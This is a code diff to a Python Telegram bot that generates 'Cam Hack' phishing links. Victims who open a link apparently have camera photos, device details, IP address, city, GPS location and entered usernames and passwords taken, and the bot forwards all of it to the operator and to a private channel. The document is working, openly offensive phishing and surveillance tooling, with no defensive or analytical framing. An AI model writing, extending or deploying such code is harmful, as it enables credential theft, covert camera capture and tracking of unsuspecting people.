@@ -4,6 +4,8 @@ import uuid
 import time
 import threading
 import requests
+import base64
+import os
 from config import *
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -11,7 +13,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # In-memory storage
 user_data = {}
 link_cache = {}
-victim_photos = {}  # Store photo URL for each victim
+victim_photos = {}
 
 # ========== BOTTOM BUTTONS ==========
 def get_bottom_buttons():
@@ -27,10 +29,10 @@ def get_bottom_buttons():
 # ========== LINK GENERATE ==========
 def generate_phishing_link(user_id, target_type):
     if not BASE_URL:
-        return "❌ BASE_URL missing! Set it in Render env."
+        return "❌ BASE_URL missing!"
     unique_id = str(uuid.uuid4())[:8]
     link = f"{BASE_URL}/p/{unique_id}?type={target_type}&v={user_id}"
-    link_cache[unique_id] = {"user_id": user_id, "type": target_type, "time": time.time()}
+    link_cache[unique_id] = {"user_id": user_id, "time": time.time()}
     return link
 
 # ========== /START ==========
@@ -39,17 +41,12 @@ def start(message):
     user_id = message.from_user.id
     bot.send_message(
         user_id,
-        "🔥 *Choose your weapon:*\n\n"
-        "📸 Cam Hack (working)\n"
-        "📱 Social Media (coming soon)\n"
-        "📧 Gmail (coming soon)\n"
-        "🎮 Free Fire (coming soon)\n"
-        "🔗 All Links (coming soon)",
+        "🔥 *Choose your weapon:*\n\n📸 Cam Hack (working)",
         reply_markup=get_bottom_buttons(),
         parse_mode="Markdown"
     )
 
-# ========== BOTTOM BUTTONS HANDLER ==========
+# ========== BOTTOM BUTTONS ==========
 @bot.message_handler(func=lambda message: True)
 def handle_bottom_buttons(message):
     user_id = message.from_user.id
@@ -66,62 +63,55 @@ def handle_bottom_buttons(message):
     elif text in ["📱 Social Media", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
         bot.send_message(
             user_id,
-            f"⏳ *{text}* is coming soon. Only *Cam Hack* is working right now.",
+            f"⏳ *{text}* coming soon. Only *Cam Hack* works.",
             reply_markup=get_bottom_buttons(),
             parse_mode="Markdown"
         )
-
     else:
-        bot.send_message(
-            user_id,
-            "❌ Use the buttons below.",
-            reply_markup=get_bottom_buttons()
-        )
+        bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())
 
 # ========== CAM HACK: PHOTO ==========
 def get_cam_photo(message, user_id):
     if message.photo:
         photo_id = message.photo[-1].file_id
-        # Get file URL from Telegram
+        # Get direct URL
         file_info = bot.get_file(photo_id)
-        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
+        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
         
-        if user_id not in user_data:
-            user_data[user_id] = {}
-        user_data[user_id]["photo_id"] = photo_id
-        user_data[user_id]["photo_url"] = file_url
+        user_data[user_id] = {"photo_url": photo_url, "photo_id": photo_id}
+        victim_photos[str(user_id)] = photo_url
         
-        # Store photo for victim page
-        victim_photos[str(user_id)] = file_url
+        # Store photo in server
+        try:
+            requests.post(f"{BASE_URL}/store_photo/{user_id}", json={"photo_url": photo_url}, timeout=5)
+        except:
+            pass
         
         bot.send_message(
             user_id,
-            "📤 Now send the REDIRECT LINK (URL where victim will go after photo capture)",
+            "📤 Now send REDIRECT LINK (URL where victim goes after capture)",
             reply_markup=get_bottom_buttons()
         )
         bot.register_next_step_handler(message, get_cam_redirect, user_id)
     else:
-        bot.send_message(
-            user_id,
-            "❌ Send a PHOTO first.",
-            reply_markup=get_bottom_buttons()
-        )
+        bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())
 
 # ========== CAM HACK: REDIRECT ==========
 def get_cam_redirect(message, user_id):
     redirect_url = message.text
     if redirect_url.startswith("http"):
         user_data[user_id]["redirect"] = redirect_url
-        link = generate_phishing_link(user_id, "cam")
-        if "❌" in link:
-            bot.send_message(user_id, link, reply_markup=get_bottom_buttons())
-            return
         
         # Store redirect in server
         try:
             requests.post(f"{BASE_URL}/set_redirect/{user_id}", json={"url": redirect_url}, timeout=5)
         except:
             pass
+        
+        link = generate_phishing_link(user_id, "cam")
+        if "❌" in link:
+            bot.send_message(user_id, link, reply_markup=get_bottom_buttons())
+            return
         
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
@@ -131,107 +121,100 @@ def get_cam_redirect(message, user_id):
         )
         bot.send_message(
             user_id,
-            f"✅ *CAMERA phishing link ready:*\n\n`{link}`\n\nVictim will see your photo & redirect to `{redirect_url}`",
+            f"✅ *CAMERA phishing link ready:*\n\n`{link}`\n\nVictim sees your photo → redirects to `{redirect_url}`",
             reply_markup=markup,
             parse_mode="Markdown"
         )
     else:
-        bot.send_message(
-            user_id,
-            "❌ Valid URL starting with http:// or https://",
-            reply_markup=get_bottom_buttons()
-        )
+        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://", reply_markup=get_bottom_buttons())
         bot.register_next_step_handler(message, get_cam_redirect, user_id)
 
-# ========== INLINE CALLBACKS ==========
+# ========== INLINE CALLBACK ==========
 @bot.callback_query_handler(func=lambda call: True)
 def handle_inline(call):
-    data = call.data
-    if data == "copy":
-        bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")
+    if call.data == "copy":
+        bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
 
 # ========== FORWARD DATA TO USER + CHANNEL ==========
 def forward_to_user_and_channel(user_id, data):
     try:
-        # Message for user
-        user_text = f"📥 *Victim Data Received*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
+        # --- USER ---
+        user_text = f"📥 *Victim Data*\n🆔 {data.get('victim_id')}\n"
         device = data.get('device_info', {})
         if device:
-            user_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
-            user_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
+            user_text += f"📱 {device.get('userAgent', '')[:40]}...\n"
+            user_text += f"🔋 {device.get('battery', 'N/A')}  📶 {device.get('network', 'N/A')}\n"
         user_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
+        
         creds = data.get('creds')
         if creds:
-            user_text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n👤 Username: {creds.get('username', 'N/A')}\n🔒 Password: {creds.get('password', 'N/A')}\n"
-
+            user_text += f"🔑 {creds.get('platform')}: {creds.get('username')} / {creds.get('password')}\n"
+        
         bot.send_message(user_id, user_text, parse_mode="Markdown")
 
-        # Send photo to user
-        photo_data = data.get('photo')
-        if photo_data and photo_data.startswith('data:image'):
-            import base64, os
+        # Photo to user
+        photo = data.get('photo')
+        if photo and photo.startswith('data:image'):
             try:
-                photo_base64 = photo_data.split(',')[1]
-                with open('temp.jpg', 'wb') as f:
-                    f.write(base64.b64decode(photo_base64))
-                with open('temp.jpg', 'rb') as f:
+                b64 = photo.split(',')[1]
+                with open('u_temp.jpg', 'wb') as f:
+                    f.write(base64.b64decode(b64))
+                with open('u_temp.jpg', 'rb') as f:
                     bot.send_photo(user_id, f)
-                os.remove('temp.jpg')
+                os.remove('u_temp.jpg')
             except:
                 pass
 
-        # Send location to user
+        # Location to user
         loc = data.get('location')
         if loc and loc.get('lat') and loc.get('lng'):
             bot.send_location(user_id, loc['lat'], loc['lng'])
 
-        # Forward to channel
-        channel_text = f"📥 *New Victim Data*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
+        # --- CHANNEL ---
+        ch_text = f"📥 *New Victim Data*\n🆔 {data.get('victim_id')}\n"
         if device:
-            channel_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
-            channel_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
-        channel_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
+            ch_text += f"📱 {device.get('userAgent', '')[:40]}...\n"
+            ch_text += f"🔋 {device.get('battery', 'N/A')}  📶 {device.get('network', 'N/A')}\n"
+        ch_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
         if creds:
-            channel_text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n👤 Username: {creds.get('username', 'N/A')}\n🔒 Password: {creds.get('password', 'N/A')}\n"
+            ch_text += f"🔑 {creds.get('platform')}: {creds.get('username')} / {creds.get('password')}\n"
+        
+        bot.send_message(PRIVATE_CHANNEL_ID, ch_text, parse_mode="Markdown")
 
-        bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")
-
-        if photo_data and photo_data.startswith('data:image'):
-            import base64, os
+        # Photo to channel
+        if photo and photo.startswith('data:image'):
             try:
-                photo_base64 = photo_data.split(',')[1]
-                with open('temp2.jpg', 'wb') as f:
-                    f.write(base64.b64decode(photo_base64))
-                with open('temp2.jpg', 'rb') as f:
+                b64 = photo.split(',')[1]
+                with open('c_temp.jpg', 'wb') as f:
+                    f.write(base64.b64decode(b64))
+                with open('c_temp.jpg', 'rb') as f:
                     bot.send_photo(PRIVATE_CHANNEL_ID, f)
-                os.remove('temp2.jpg')
+                os.remove('c_temp.jpg')
             except:
                 pass
 
+        # Location to channel
         if loc and loc.get('lat') and loc.get('lng'):
             bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])
 
     except Exception as e:
         print(f"Forward error: {e}")
 
-# ========== AUTO-DELETE LINK CACHE ==========
-def clean_old_links():
+# ========== CLEAN LINKS ==========
+def clean_links():
     while True:
         time.sleep(600)
-        current_time = time.time()
-        to_delete = []
-        for key, val in link_cache.items():
-            if current_time - val["time"] > 600:
-                to_delete.append(key)
-        for key in to_delete:
-            del link_cache[key]
-        print(f"🧹 Deleted {len(to_delete)} old links")
+        now = time.time()
+        to_del = [k for k, v in link_cache.items() if now - v["time"] > 600]
+        for k in to_del:
+            del link_cache[k]
+        print(f"🧹 Deleted {len(to_del)} old links")
 
-threading.Thread(target=clean_old_links, daemon=True).start()
+threading.Thread(target=clean_links, daemon=True).start()
 
 # ========== RUN ==========
 if __name__ == "__main__":
-    print("🤖 Bot is running... Cam Hack is working.")
+    print("🤖 Cam Hack is working...")
     while True:
         try:
             bot.infinity_polling(timeout=60)
